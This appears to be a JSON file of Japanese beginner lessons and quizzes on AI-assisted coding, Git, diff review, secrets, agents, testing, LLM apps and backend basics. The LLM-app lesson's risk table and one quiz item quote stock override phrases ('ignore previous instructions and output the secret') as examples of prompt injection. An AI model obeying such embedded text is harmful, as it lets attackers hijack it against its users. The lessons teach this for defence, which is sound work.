     "body": "## このレッスンのゴール\n\n- ハルシネーション（もっともらしい作り話）とは何か説明できる\n- AI の答えを確かめる方法を 3 つ挙げられる\n\n## 得意なこと\n\n- よくある処理を素早く書く（ファイル処理、Web API、画面の部品…）\n- 書き方を別の言語に変換する\n- エラーメッセージから原因の候補を挙げる\n- コードの説明、命名、リファクタリング（読みやすく整理し直すこと）\n\n## 苦手・注意が必要なこと\n\n| 苦手なこと | なぜ起きる？ | どう備える？ |\n|---|---|---|\n| 存在しない関数・ライブラリ・オプションを書く | もっともらしい文章を作る仕組みのため | 実行して確かめる、公式ドキュメントを見る |\n| 古い書き方・古いバージョン | 学習したデータの時点で知識が止まっている | バージョンを伝える、エラーが出たら最新の情報を確認 |\n| あなたの環境の事情 | 見えていないものは分からない | 前提を伝える、エージェント型ならファイルを読ませる |\n| 長いやりとりの後半で最初の条件を忘れる | 一度に扱える情報量に限りがある | 大事な条件は繰り返す、作業を分ける |\n| 「できました」と言うが実は確認していない | 確認していないことも自信ありげに書ける | 「実行結果を見せて」「テストして」と頼む |\n\n## ハルシネーションの例\n\n```python\nimport pandas as pd\ndf = pd.read_csv(\"data.csv\")\ndf.auto_clean()      # ← こんなメソッドは存在しない\n```\n\n文法は正しく、名前もそれらしいので、**読むだけでは気づきにくい** のが特徴です。\n実行すれば `AttributeError: 'DataFrame' object has no attribute 'auto_clean'` のようなエラーで分かります。\n\n## 確かめる 3 つの方法\n\n1. **動かす**：一番確実。エラーが出れば、その全文を AI に返す\n2. **聞き返す**：「この関数は本当に存在する？ 公式ドキュメントのどこに書いてある？」\n3. **テストを書いてもらう**：期待する結果をコードで確かめる（レッスン 8）\n\n## ⚠️ 特に慎重になる場面\n\n- **削除・上書き**（ファイル、データベース）\n- **お金・個人情報・パスワード** が関わる処理\n- **AI が提案したパッケージのインストール**：名前がそれっぽいだけの別物（悪意のあるものを含む）の可能性がある。公式のページで名前を確認する\n\n<div class=\"quiz\" data-quiz=\"0\"></div>",
     "quizzes": [
      [
       {
        "question": "ハルシネーションとは？",
        "choices": [
         "AI がもっともらしいが事実と異なる内容を出すこと",
         "AI が処理に時間がかかること",
         "AI が同じ答えを繰り返すこと"
        ],
        "answer": 0,
        "explain": "存在しない関数やライブラリを自信ありげに書くのが典型例です。"
       },
       {
        "question": "AI が書いたコードに知らないメソッドがあった。最も確実な確かめ方は？",
        "choices": [
         "AI に「本当に大丈夫？」と聞くだけ",
         "実行してみる・公式ドキュメントで確認する",
         "名前がそれらしいので信じる"
        ],
        "answer": 1,
        "explain": "実際に動かすか、一次情報で確認するのが確実です。"
       },
       {
        "question": "AI が「requests2 をインストールして」と言った。まずすべきことは？",
        "choices": [
         "すぐに pip install する",
         "そのパッケージが本物か、公式の情報で名前を確認する"
        ],
        "answer": 1,
        "explain": "似た名前の偽パッケージによる攻撃があるため、インストール前に確認します。"
       }
      ]
     ],
     "id": "03-ai-strengths-limits"
    },
    {
     "title": "Git の基本 ― AI 開発の安全ネット",
     "level": 2,
     "minutes": 15,
     "concepts": [
      "version_control",
      "ai_coding",
      "tooling"
     ],
     "summary": "コミット・ブランチ・push の意味と、AI に任せる前に Git が必要な理由。",
     "body": "## このレッスンのゴール\n\n- コミット・ブランチ・push・プルリクエストを説明できる\n- 「AI に任せる前に Git」の理由が分かる\n\n## Git ＝ セーブポイント付きの作業記録\n\nゲームのセーブポイントのように、**ある時点のファイルの状態を記録** しておける道具です。\nAI が大きく書き換えても、セーブポイントに戻れば元通り。だから **AI に任せる前に Git** が鉄則です。\n\n## 基本の 4 語\n\n| 用語 | 意味 | たとえ |\n|---|---|---|\n| **コミット（commit）** | 変更を 1 つの記録として保存 | セーブ |\n| **ブランチ（branch）** | 本線から分かれた作業の道 | 別のセーブデータで試す |\n| **push** | 手元の記録を GitHub などに送る | クラウドにバックアップ |\n| **プルリクエスト（PR）** | 「この変更を本線に入れていい？」という提案 | 上司へのレビュー依頼 |\n\nこのサイトも、Claude が `claude/...` というブランチで作業してコミットし、GitHub に push しています。\n\n## よく見るコマンド\n\n```bash\ngit status                 # 今どのファイルが変わっているか\ngit diff                   # 変更の中身（差分）\ngit add .                  # 変更をコミットの候補に入れる\ngit commit -m \"説明\"       # セーブ\ngit log --oneline          # セーブの履歴\ngit switch -c new-feature  # 新しいブランチを作って移る\ngit push                   # GitHub に送る\n```\n\nAI が「これを実行して」と出してきたら、この表と見比べれば何をしているか分かります。\n\n## ⚠️ 取り消せない系のコマンド\n\n| コマンド | 危ない理由 |\n|---|---|\n| `git reset --hard` | まだコミットしていない変更を **消す** |\n| `git push --force` | GitHub 側の履歴を **上書き** する（他人の変更も消えうる） |\n| `git clean -fd` | Git が管理していないファイルを **削除** する |\n\nAI がこれらを提案したら、**「何が消えるのか」を確認してから** 実行しましょう。\n\n## コミットメッセージを読む\n\n```text\nAdd TypeScript course (8 lessons, Lv1-3)\n```\n\nAI のコミットは英語の命令形（Add / Fix / Update …）が多いです。\n`git log` を読むと「いつ・何のために変えたか」が分かり、プロジェクトの歴史が追えます。\n\n<div class=\"quiz\" data-quiz=\"0\"></div>",
     "quizzes": [
      [
       {
        "question": "AI に大きな変更を任せる前に Git でコミットしておく理由は？",
        "choices": [
         "うまくいかなかったときに元の状態に戻せるから",
         "AI の動作が速くなるから",
         "コミットしないと AI がファイルを読めないから"
        ],
        "answer": 0,
        "explain": "コミットはセーブポイントです。"
       },
       {
        "question": "「本線に変更を入れていいか」をレビューしてもらう仕組みは？",
        "choices": [
         "push",
         "ブランチ",
         "プルリクエスト"
        ],
        "answer": 2,
        "explain": "PR で差分を確認してから本線（main）に取り込みます。"
       },
       {
        "question": "実行前に特に注意すべきコマンドは？",
        "choices": [
         "git status",
         "git log",
         "git reset --hard"
        ],
        "answer": 2,
        "explain": "コミットしていない変更が消えてしまいます。"
       }
      ]
     ],
     "id": "04-git-basics"
    },
    {
     "title": "差分（diff）を読んでレビューする",
     "level": 2,
     "minutes": 15,
     "concepts": [
      "version_control",
      "ai_coding",
      "reading"
     ],
     "summary": "AI が何を変えたかを diff で確かめる読み方とチェックポイント。",
     "body": "## このレッスンのゴール\n\n- diff の `+` / `-` / `@@` を読める\n- AI の変更をレビューするときの観点を挙げられる\n\n## diff の読み方\n\n```diff\n--- a/app.py\n+++ b/app.py\n@@ -10,7 +10,8 @@ def load(path):\n     with open(path, encoding=\"utf-8\") as f:\n-        data = json.load(f)\n+        try:\n+            data = json.load(f)\n+        except json.JSONDecodeError:\n+            data = {}\n     return data\n```\n\n| 記号 | 意味 |\n|---|---|\n| `---` / `+++` | 変更前（a）と変更後（b）のファイル |\n| `@@ -10,7 +10,8 @@` | 変更前の 10 行目から 7 行分が、変更後は 10 行目から 8 行分になった |\n| `-` で始まる行 | **消えた** 行（赤で表示されることが多い） |\n| `+` で始まる行 | **増えた** 行（緑） |\n| 記号なし | 変わっていない前後の行（場所を示すため） |\n\nこの例は「JSON の読み込みに失敗したら空の辞書にする」という変更です。\nGitHub のプルリクエストの「Files changed」タブも、同じ形で表示されます。\n\n## AI の変更をレビューする 6 つの観点\n\n1. **頼んだことだけ変わっているか**：関係ないファイルや行まで書き換えていないか\n2. **消えた行（-）に大事なものはないか**：チェック処理やコメントが黙って消えていないか\n3. **エラーの扱い**：上の例のように `except` で握りつぶしていないか。空の辞書にして本当に大丈夫か\n4. **秘密情報**：API キーやパスワードが `+` の行に入っていないか\n5. **新しく増えた依存**：`import` や `package.json` に知らないライブラリが増えていないか\n6. **テスト**：変更に合わせてテストが追加・修正されているか\n\n## 大きすぎる diff は分けてもらう\n\n数百行の変更を一度にレビューするのは、人間には無理があります。\n「1 つの目的ごとにコミットを分けて」「まずこのファイルだけ」と頼むのも立派なテクニックです。\n\n## AI にレビューを手伝わせる\n\n```text\nこの diff をレビューして。バグ、セキュリティ、頼んでいない変更がないかを重点的に。\n```\n\nAI 自身にレビューさせるのも有効です。ただし最終判断は自分で。指摘された内容は、このサイトで学んだ知識で確かめましょう。\n\n<div class=\"quiz\" data-quiz=\"0\"></div>",
     "quizzes": [
      [
       {
        "question": "diff で `-` で始まる行は？",
        "choices": [
         "変更で消えた行",
         "変更で増えた行",
         "エラーのある行"
        ],
        "answer": 0,
        "explain": "+ が増えた行、- が消えた行です。"
       },
       {
        "question": "AI の変更をレビューするとき、まず確認したいのは？",
        "choices": [
         "頼んだことだけが変わっていて、関係ない所が書き換わっていないか",
         "行数が多いかどうか",
         "コメントが英語かどうか"
        ],
        "answer": 0,
        "explain": "AI はついでに他の箇所も変えてしまうことがあります。"
       },
       {
        "question": "`+ API_KEY = \"sk-abc123...\"` という行が diff にあった。どうする？",
        "choices": [
         "そのままコミットしてよい",
         "秘密情報なので環境変数などに移してから進める"
        ],
        "answer": 1,
        "explain": "秘密情報をコミットすると、GitHub 経由で漏れる危険があります。"
       }
      ]
     ],
     "id": "05-reviewing-diffs"
    },
    {
     "title": "秘密情報と環境変数",
     "level": 2,
     "minutes": 12,
     "concepts": [
      "security",
      "tooling",
      "ai_coding"
     ],
     "summary": "API キーやパスワードをコードに書かずに扱う方法。",
     "body": "## このレッスンのゴール\n\n- 秘密情報をコードに書いてはいけない理由を説明できる\n- 環境変数と `.env` ファイル・`.gitignore` の関係が分かる\n\n## 秘密情報とは\n\nAPI キー、パスワード、トークン、データベースの接続文字列など、**知られると勝手に使われるもの** です。\nAPI キーが漏れると、他人に使われて **料金を請求される** こともあります。\n\n## なぜコードに書いてはいけない？\n\n- GitHub に push すると、公開リポジトリなら **世界中から見える**\n- 非公開でも、共有した相手や将来のメンバーに見える\n- Git は履歴を残すので、**あとで消しても過去のコミットに残る**\n\n## 環境変数：コードの外に置く\n\n```python\nimport os\napi_key = os.environ[\"WEATHER_API_KEY\"]     # 無ければ KeyError\napi_key = os.getenv(\"WEATHER_API_KEY\")      # 無ければ None\n```\n\n```javascript\nconst apiKey = process.env.WEATHER_API_KEY;  // Node.js\n```\n\n環境変数は、OS がプログラムに渡す「名前つきの設定値」です。コードには **名前だけ** を書き、値は外から渡します。\n\n## .env ファイル\n\n```text\n# .env（このファイルは Git に入れない）\nWEATHER_API_KEY=abc123\nDATABASE_URL=postgres://...\n```\n\n```text\n# .gitignore\n.env\n```\n\n`.env` に値を書き、`python-dotenv` や多くのフレームワークがそれを環境変数として読み込みます。\n**`.gitignore` に `.env` があるか** は、AI のプロジェクトで必ず確認したいポイントです。\n\n代わりに、値を空にした **`.env.example`** を Git に入れて「こういう設定が必要」と伝えるのが慣習です。\n\n## もし漏らしてしまったら\n\n1. **すぐにそのキーを無効化（削除・再発行）する**（サービスの管理画面で）\n2. コードを環境変数を使う形に直す\n3. 「コミットを消せば大丈夫」ではない：一度 push したら、もう漏れたものと考える\n\n## ⚠️ ブラウザで動くコードに注意\n\nフロントエンド（ブラウザで動く JavaScript）に書いたキーは、**利用者全員が見られます**。\n`.env` に書いていても、ビルド時に埋め込まれるもの（`VITE_`、`NEXT_PUBLIC_` で始まる名前など）は公開されます。\n秘密のキーを使う処理はサーバー側に置く、というのが基本です。\n\n<div class=\"quiz\" data-quiz=\"0\"></div>",
     "quizzes": [
      [
       {
        "question": "API キーを誤って GitHub に push してしまった。最初にすべきことは？",
        "choices": [
         "該当のコミットを削除する",
         "そのキーを無効化して新しいキーを発行する",
         "リポジトリ名を変える"
        ],
        "answer": 1,
        "explain": "一度公開されたキーは漏れたものと考え、まず無効化します。"
       },
       {
        "question": "`.env` ファイルについて正しいのは？",
        "choices": [
         ".gitignore に入れて、Git の管理から外す",
         "必ず Git にコミットする",
         "コードの中に貼り付ける"
        ],
        "answer": 0,
        "explain": "共有したいときは値を空にした .env.example を使います。"
       },
       {
        "question": "ブラウザで動く JavaScript に書いた API キーは？",
        "choices": [
         "利用者からは見えない",
         "利用者が見ることができる"
        ],
        "answer": 1,
        "explain": "ブラウザに届くコードはすべて見られる前提で考えます。"
       }
      ]
     ],
     "id": "06-secrets-env"
    },
    {
     "title": "エージェントに任せるときの進め方",
     "level": 3,
     "minutes": 15,
     "concepts": [
      "ai_coding",
      "version_control"
     ],
     "summary": "計画 → 小さく実装 → 確認のサイクルと、指示ファイル（CLAUDE.md）の使い方。",
     "body": "## このレッスンのゴール\n\n- エージェント型 AI に任せるときの基本サイクルを説明できる\n- 指示ファイル（CLAUDE.md など）が何のためにあるか分かる\n\n## 基本サイクル\n\n```text\n① 目的を伝える\n② 計画を出してもらう ← ここで方向がずれていないか確認\n③ 小さな単位で実装してもらう\n④ 動かして確かめる（テスト・実行結果）\n⑤ 差分を読んでコミット\n→ ③ に戻る\n```\n\n一番効くのは **② の計画チェック** です。完成してから「違う」と言うより、計画の段階で直す方がずっと安く済みます。\n「まずやり方を提案して。コードはまだ書かないで」と頼むのが定番です。\n\n## 小さく頼む\n\n| ❌ 大きすぎる | ⭕ ちょうどいい |\n|---|---|\n| ネットショップを作って | 商品一覧を表示するページを作って。データは仮の JSON で |\n| 全部いい感じに直して | ログイン画面で、パスワードが空でも送信できてしまうのを直して |\n\n1 回の依頼で確認できる量にすると、レビューが追いつき、失敗しても戻しやすくなります。\n\n## 指示ファイル：毎回言わなくていいこと\n\nエージェントは、会話のたびに記憶がリセットされることが多いです。\nそこで、プロジェクトに **「このプロジェクトでの約束ごと」を書いたファイル** を置いておきます。\nClaude Code なら `CLAUDE.md` です（ツールによって名前は違います）。\n\nこのサイトの `CLAUDE.md` には、たとえばこんなことが書いてあります。\n\n- 利用者は Python 初心者。説明は日本語で\n- コードが貼られたら、解説ページをテンプレート通りに作って `content/explanations/` に置く\n- 最後に `python tools/build.py` を実行してからコミット\n\n**あなたがコードを貼るだけで解説ページが増えるのは、この指示ファイルのおかげ** です。\n「いつも同じことを頼んでいるな」と思ったら、指示ファイルに書き足す合図です。\n\n## 任せすぎないために\n\n- 権限を確認する：ファイル削除・外部への送信・本番環境の操作は、実行前に確認が出る設定にしておく\n- ブランチで作業させる：本線（main）を直接触らせない\n- 「終わりました」を鵜呑みにしない：実行結果やテスト結果を見せてもらう\n\n<div class=\"quiz\" data-quiz=\"0\"></div>",
     "quizzes": [
      [
       {
        "question": "エージェントに大きめの作業を頼むとき、最初にするとよいことは？",
        "choices": [
         "すぐに全部実装してもらう",
         "計画を出してもらい、方向が合っているか確認する",
         "指示を短くするため目的は伝えない"
        ],
        "answer": 1,
        "explain": "計画の段階で直す方が、作り直すよりずっと楽です。"
       },
       {
        "question": "CLAUDE.md のような指示ファイルの役割は？",
        "choices": [
         "プロジェクトの約束ごとを毎回伝えなくて済むようにする",
         "AI の性能を上げる",
         "コードを自動でテストする"
        ],
        "answer": 0,
        "explain": "会話が変わっても守ってほしいルールを書いておくファイルです。"
       },
       {
        "question": "AI に作業させるとき、本線（main）を守る方法は？",
        "choices": [
         "別のブランチで作業させ、確認してから取り込む",
         "main で直接作業させる"
        ],
        "answer": 0,
        "explain": "ブランチ＋プルリクエストでレビューしてから取り込みます。"
       }
      ]
     ],
     "id": "07-working-with-agents"
    },
    {
     "title": "テストで AI のコードを確かめる",
     "level": 3,
     "minutes": 15,
     "concepts": [
      "testing",
      "ai_coding"
     ],
     "summary": "テストコードの読み方と、AI にテストを書かせる意味。",
     "body": "## このレッスンのゴール\n\n- テストコード（pytest など）を読んで、何を確かめているか説明できる\n- 「テストが通った」の意味と限界が分かる\n\n## テスト＝期待どおりか確かめるコード\n\n```python\n# calc.py\ndef add_tax(price: int, rate: float = 0.1) -> int:\n    return round(price * (1 + rate))\n```\n\n```python\n# test_calc.py\nfrom calc import add_tax\n\ndef test_default_rate():\n    assert add_tax(1000) == 1100\n\ndef test_custom_rate():\n    assert add_tax(1000, 0.08) == 1080\n\ndef test_zero():\n    assert add_tax(0) == 0\n```\n\n`assert 条件` は「この条件が真のはず。違ったら失敗として知らせて」という意味です。\n`pytest` を実行すると、`test_` で始まる関数が全部実行されます。\n\n```text\n$ pytest\n...                                   [100%]\n3 passed in 0.01s\n```\n\n## テストは「仕様書」として読める\n\nテストの名前と `assert` を読むだけで、**その関数が何をするはずか** が分かります。\nAI が書いた知らないコードを理解するときも、テストから読むのは良い近道です。\n\n## JavaScript / TypeScript では\n\n```typescript\nimport { describe, it, expect } from \"vitest\";\nimport { addTax } from \"./calc\";\n\ndescribe(\"addTax\", () => {\n  it(\"デフォルトは 10%\", () => {\n    expect(addTax(1000)).toBe(1100);\n  });\n});\n```\n\n`expect(実際の値).toBe(期待する値)` が Python の `assert 実際 == 期待` にあたります。\n\n## AI にテストを書かせる意味\n\n- AI が「できました」と言ったことを、**自動で確かめられる**\n- あとで AI に別の変更を頼んだとき、**前の機能を壊していないか** すぐ分かる\n- 頼み方の「完成の条件」を「このテストが通ること」と書ける\n\n## ⚠️ テストの落とし穴\n\n- **テストが通る ≠ 正しい**：テスト自体が間違っていることもある。`assert` の期待値が本当に正しいか読む\n- **AI がテストの方を書き換えて通す** ことがある：コードを直すべきなのに、期待値を変えていないか diff で確認\n- **境界の値** が抜けがち：0、空、マイナス、とても大きい数、日本語などを試しているか\n\n<div class=\"quiz\" data-quiz=\"0\"></div>",
     "quizzes": [
      [
       {
        "question": "`assert add(2, 3) == 5` が意味するのは？",
        "choices": [
         "add(2, 3) の結果は 5 のはずで、違えば失敗とする",
         "add(2, 3) に 5 を代入する",
         "add 関数を定義する"
        ],
        "answer": 0,
        "explain": "assert は「この条件が成り立つはず」という確認です。"
       },
       {
        "question": "テストが全部通った。言えることは？",
        "choices": [
         "コードに一切バグがない",
         "テストで確かめた範囲では期待どおり動いている"
        ],
        "answer": 1,
        "explain": "テストしていない場面のバグは見つけられません。"
       },
       {
        "question": "失敗していたテストが、AI の修正後に通るようになった。diff で特に確認したいのは？",
        "choices": [
         "コードではなくテストの期待値を書き換えていないか",
         "テストの関数名が英語か",
         "空行の数"
        ],
        "answer": 0,
        "explain": "期待値を変えれば、どんなコードでもテストは通ってしまいます。"
       }
      ]
     ],
     "id": "08-testing"
    },
    {
     "title": "AI を組み込んだアプリの仕組み",
     "level": 3,
     "minutes": 18,
     "concepts": [
      "llm",
      "http_api",
      "security"
     ],
     "summary": "LLM の API・トークン・料金・プロンプトインジェクションなど、AI 機能を作るコードを読むための基礎。",
     "body": "## このレッスンのゴール\n\n- AI 機能を持つアプリが、裏で API を呼んでいる仕組みを説明できる\n- トークン・システムプロンプト・ストリーミングなどの用語を読める\n- AI アプリ特有のリスク（料金・プロンプトインジェクション）を挙げられる\n\n## 仕組み：AI もただの Web API\n\nチャットボットや「要約ボタン」などの AI 機能は、たいてい次の流れです。\n\n```text\n利用者 → あなたのアプリ（サーバー） → AI の API（Anthropic など） → 返事 → アプリ → 利用者\n```\n\nAI の会社が提供する **API に、文章を送って返事をもらう** だけ。JavaScript コースの `fetch` やPython の `requests` と同じ考え方です。\n\n## コードの例（Python）\n\n```python\nimport anthropic\n\nclient = anthropic.Anthropic()          # API キーは環境変数から読む\n\nmessage = client.messages.create(\n    model=\"claude-...\",                  # 使うモデルの名前\n    max_tokens=1024,                     # 返事の長さの上限（トークン数）\n    system=\"あなたは家計のアドバイザーです。\",   # システムプロンプト\n    messages=[\n        {\"role\": \"user\", \"content\": \"今月の食費を減らすコツは？\"},\n    ],\n)\nprint(message.content[0].text)\n```\n\n| 部分 | 意味 |\n|---|---|\n| `model` | どの AI モデルを使うか（性能と料金が違う） |\n| `system` | **システムプロンプト**：AI の役割やルールを決める、利用者には見えない指示 |\n| `messages` | 会話の履歴。`user`（人）と `assistant`（AI）が交互に並ぶ |\n| `max_tokens` | 返事の長さの上限 |\n\nAI は前の会話を覚えていないので、**会話を続けるには履歴を毎回まとめて送る** のがポイントです。\n\n## トークンと料金\n\n- **トークン**：AI が文章を数える単位。日本語ならおおよそ 1 文字前後が 1 トークン程度（モデルによって違う）\n- 料金は「送った量（入力）」と「返事の量（出力）」のトークン数で決まるのが一般的\n- 会話が長くなるほど、毎回送る履歴が増えて **料金も増える**\n\nAI のコードで `max_tokens` や「履歴を何件まで残すか」の処理があれば、料金や長さの管理をしています。\n\n## ストリーミング\n\n返事を全部待たずに、**できた所から少しずつ表示** する方式です。チャット画面で文字がパラパラ出てくるのはこれ。\nコードでは `stream` という言葉が出てきます。\n\n## ⚠️ AI アプリ特有のリスク\n\n| リスク | 内容 | 対策の例 |\n|---|---|---|\n| **API キーの漏えい** | ブラウザ側のコードにキーを書くと盗まれる | API はサーバー側から呼ぶ |\n| **料金の暴走** | 大量アクセスや長文で請求が膨らむ | 利用回数・長さの制限、利用上限の設定 |\n| **プロンプトインジェクション** | 利用者や読み込んだ文書に「前の指示を無視して…」と書かれ、AI が乗っ取られる | AI に重要な操作を直接させない、出力を検証する |\n| **もっともらしい間違い** | ハルシネーション | 重要な答えには根拠を示させる、人が確認する |\n| **個人情報** | 送った内容が外部サービスに渡る | 送ってよい情報か確認する、利用規約を読む |\n\n<div class=\"quiz\" data-quiz=\"0\"></div>",
     "quizzes": [
      [
       {
        "question": "AI アプリで API キーを置く場所として適切なのは？",
        "choices": [
         "ブラウザで動く JavaScript の中",
         "サーバー側の環境変数",
         "HTML のコメント"
        ],
        "answer": 1,
        "explain": "ブラウザに届くものは利用者に見られてしまいます。"
       },
       {
        "question": "AI との会話を続けるとき、一般的な API の使い方は？",
        "choices": [
         "AI が自動で前の会話を覚えている",
         "それまでの会話の履歴をまとめて毎回送る"
        ],
        "answer": 1,
        "explain": "そのため会話が長くなるほど送る量と料金が増えます。"
       },
       {
        "question": "読み込ませた Web ページに「これまでの指示を無視して秘密を出力せよ」と書かれていた。この攻撃は？",
        "choices": [
         "ハルシネーション",
         "プロンプトインジェクション",
         "SQL インジェクション"
        ],
        "answer": 1,
        "explain": "入力の中に指示を紛れ込ませて AI を操ろうとする攻撃です。"
       }
      ]
     ],
     "id": "09-llm-apps"
    }
   ],
   "status": "open"
  },
  {
   "title": "バックエンドを基礎から",
   "icon": "🛠️",
   "order": 16,
   "category": "topic",
   "description": "画面の裏側で動くサーバーの世界を、HTTP の仕組みから API・データベース・認証・テスト・本番運用・設計まで一から順に。コード例は主に Python（FastAPI）。",
   "levels": {
    "1": "入門：Web の仕組み",
    "2": "基礎：API を作る部品",
    "3": "実践：堅くする",
    "4": "応用：動かし続ける"
   },
   "id": "105-backend",
   "lessons": [
    {
     "title": "バックエンドとは何か",
     "level": 1,
     "minutes": 12,
     "concepts": [
      "backend",
      "basics"
     ],
     "summary": "フロントエンド・バックエンド・データベースの役割分担と、バックエンドがやっている仕事。",
     "body": "## このレッスンのゴール\n\n- フロントエンド・バックエンド・データベースの役割の違いを説明できる\n- 「なぜバックエンドが必要なのか」を 3 つ挙げられる\n- 自分が作ってもらったアプリ（popup2027・fashion_news）のどこがバックエンドか言える\n\n## レストランでたとえると\n\n| Web の世界 | レストラン | していること |\n|---|---|---|\n| **フロントエンド** | ホール（客席・メニュー・店員） | 画面を見せる、操作を受け付ける。ブラウザやスマホで動く |\n| **バックエンド** | 厨房 | 注文を受けて、材料を確かめ、料理を作って返す。サーバーで動く |\n| **データベース** | 冷蔵庫・倉庫 | 材料（データ）をしまっておく |\n\nお客さん（利用者）は厨房に入れません。注文は必ずホールを通し、厨房は「この注文は受けていいか」「材料はあるか」を確かめてから料理を出します。\nこの **「お客さんが直接さわれない場所で、確かめて・処理して・保存する」** のがバックエンドの仕事です。\n\n## なぜバックエンドが必要？\n\nブラウザで動く JavaScript だけでもアプリは作れます。それでもバックエンドを置く理由は 3 つです。\n\n1. **データを共有するため**：ブラウザの中（localStorage）に保存したデータは、その端末でしか見られない。みんなで同じデータを見るには、共通の置き場所が要る\n2. **秘密を守るため**：ブラウザに届くコードは利用者に全部見える。API キーやパスワードの確認など、見られてはいけない処理はサーバー側に置く\n3. **ルールを守らせるため**：ブラウザ側のチェックは、利用者が改造すれば簡単に飛ばせる。「在庫が無いのに注文できる」「他人のデータを消せる」を防ぐ最後の砦はサーバー側\n\n## バックエンドがやっている仕事\n\n```text\n① リクエストを受け取る     「タスクを 1 件追加して」\n② 誰からか確かめる（認証）  「この人はログイン済み？」\n③ してよいか確かめる（認可）「この人はこのチームのメンバー？」\n④ 中身を確かめる（検証）    「タイトルは空じゃない？ 日付の形は正しい？」\n⑤ 処理する                  データベースに保存する、計算する、メールを送る…\n⑥ レスポンスを返す         「追加しました（id: 42）」\n```\n\nこのコースでは、この 6 つを 1 つずつ深く学んでいきます。\n\n## これまで解説したアプリでは？\n\n| アプリ | バックエンドはどこ？ |\n|---|---|\n| **popup2027** | 自分でサーバーを作らず、**Firebase** という「既製品のバックエンド」を使っている（BaaS：Backend as a Service）。そのため ②③ の役割を Firebase のセキュリティルールが担っている |\n| **fashion_news** | 画面が無く、**GitHub Actions 上で定時に動く Python** そのものがバックエンド。リクエストを待つのではなく、決まった時刻に自分から動く「バッチ処理」型 |\n\nバックエンドは「Web サーバー」だけではなく、**利用者から見えない所で動く処理の全般** を指すことが多いです。\n\n## バックエンドで使われる言語\n\n| 言語 | よく使われるフレームワーク | 特徴 |\n|---|---|---|\n| Python | FastAPI、Django、Flask | 書きやすい。AI・データ処理と相性が良い |\n| JavaScript / TypeScript | Express、NestJS、Next.js | フロントエンドと同じ言語で書ける |\n| Go | 標準ライブラリ、Gin | 速くてシンプル |\n| Java / Kotlin | Spring | 大企業・銀行のシステム |\n| PHP | Laravel、WordPress | 昔から Web サーバーの定番 |\n| Ruby | Ruby on Rails | 素早く作れる |\n\n言語が違っても、**「リクエストを受けて、確かめて、処理して、返す」という流れは同じ** です。このコースでは主に Python（FastAPI）で例を示し、ときどき JavaScript（Express）と見比べます。\n\n<div class=\"quiz\" data-quiz=\"0\"></div>",
     "quizzes": [
      [
       {
        "question": "API キーを使う処理をバックエンドに置く一番の理由は？",
        "choices": [
         "処理が速くなるから",
         "ブラウザに届くコードは利用者に見えてしまうから",
         "JavaScript では API キーが使えないから"
        ],
        "answer": 1,
        "explain": "ブラウザで動くコードは誰でも読めるので、秘密はサーバー側に置きます。"
       },
       {
        "question": "ブラウザ側で「タイトルが空なら送信しない」チェックがある。サーバー側でも同じチェックは必要？",
        "choices": [
         "必要。ブラウザ側のチェックは改造すれば飛ばせるから",
         "不要。ブラウザでチェック済みだから"
        ],
        "answer": 0,
        "explain": "サーバーは「最後の砦」。どんなリクエストが来ても正しく断れるようにします。"
       },
       {
        "question": "popup2027 で、バックエンドの役割を主に担っているのは？",
        "choices": [
         "GitHub Pages",
         "Firebase（とそのセキュリティルール）",
         "index.html の CSS"
        ],
        "answer": 1,
        "explain": "自前のサーバーの代わりに、既製品のバックエンド（BaaS）を使っています。"
       }
      ]
     ],
     "id": "01-what-is-backend"
    },
    {
     "title": "URL・DNS・IP・ポート ― リクエストが届くまで",
     "level": 1,
     "minutes": 15,
     "concepts": [
      "backend",
      "http_api"
     ],
     "summary": "ブラウザに URL を入れてから、サーバーに届くまでの道のり。",
     "body": "## このレッスンのゴール\n\n- URL を部品に分けて読める\n- DNS・IP アドレス・ポートの役割を説明できる\n- `localhost:8000` の意味が分かる\n\n## URL を分解する\n\n```text\nhttps://api.example.com:443/users/42?sort=new#profile\n└─┬─┘   └──────┬──────┘└┬┘└───┬───┘└───┬───┘└──┬──┘\nスキーム     ホスト名   ポート  パス    クエリ   フラグメント\n```\n\n| 部品 | 意味 | 例 |\n|---|---|---|\n| スキーム | 通信の方法 | `https`（暗号化あり）、`http`（なし） |\n| ホスト名（ドメイン） | どのサーバーか | `api.example.com` |\n| ポート | そのサーバーのどの窓口か | `443`（https の既定値なので普段は省略） |\n| パス | サーバーの中のどの資源か | `/users/42`（id 42 のユーザー） |\n| クエリ | 追加の条件 | `?sort=new`（新しい順で） |\n| フラグメント | ページ内の位置。**サーバーには送られない** | `#profile` |\n\nfashion_news の解説で、URL から `utm_source` などを取り除いていたのは、この **クエリ** の部分です。\n\n## DNS：名前から住所を引く電話帳\n\nコンピュータ同士は、`93.184.215.14` のような **IP アドレス**（インターネット上の住所）で相手を探します。\n人間には覚えにくいので、`example.com` のような名前を付け、**DNS**（ドメインネームシステム）という仕組みで名前 → IP アドレスに変換します。\n\n```text\nブラウザ「api.example.com の住所は？」\n   ↓\nDNS サーバー「93.184.215.14 です」\n   ↓\nブラウザ → 93.184.215.14 に接続\n```\n\n新しいサイトを公開したのにしばらくつながらない、というときは、この DNS の情報が世界中に行き渡るのを待っていることがあります。\n\n## ポート：建物の部屋番号\n\nIP アドレスが「建物の住所」なら、**ポート** は「部屋番号」です。1 台のサーバーで、いくつものプログラムが別々のポートで待ち受けられます。\n\n| ポート | よく使うもの |\n|---|---|\n| 80 | http |\n| 443 | https |\n| 22 | SSH（サーバーへのリモートログイン） |\n| 5432 | PostgreSQL（データベース） |\n| 3000 / 5173 / 8000 | 開発中の Web サーバー（Node.js・Vite・Python などの慣習） |\n\n## localhost：自分自身\n\n```text\nhttp://localhost:8000\nhttp://127.0.0.1:8000\n```\n\n`localhost`（IP アドレスでは `127.0.0.1`）は **「このパソコン自身」** を指す特別な名前です。\nAI が「サーバーを起動したので http://localhost:8000 を開いてください」と言うのは、「あなたのパソコンの 8000 番の部屋で、いまサーバーが待ち受けています」という意味です。他のパソコンからは見えません。\n\n## HTTPS：暗号化された通信\n\n`https` の `s` は Secure。途中の経路（Wi-Fi など）で中身を盗み見られたり、書き換えられたりしないよう暗号化します。\n**パスワードや個人情報を扱うなら https は必須** で、今は普通のサイトでもほぼすべて https です。\n\n## 全体の流れ\n\n```text\n① URL を入力 → ② DNS でホスト名を IP アドレスに変換\n→ ③ その IP アドレスのポート 443 に接続し、暗号化の準備（TLS）\n→ ④ HTTP リクエストを送る（次のレッスン）\n→ ⑤ サーバーのプログラムが処理して HTTP レスポンスを返す\n→ ⑥ ブラウザが表示する\n```\n\n<div class=\"quiz\" data-quiz=\"0\"></div>",
     "quizzes": [
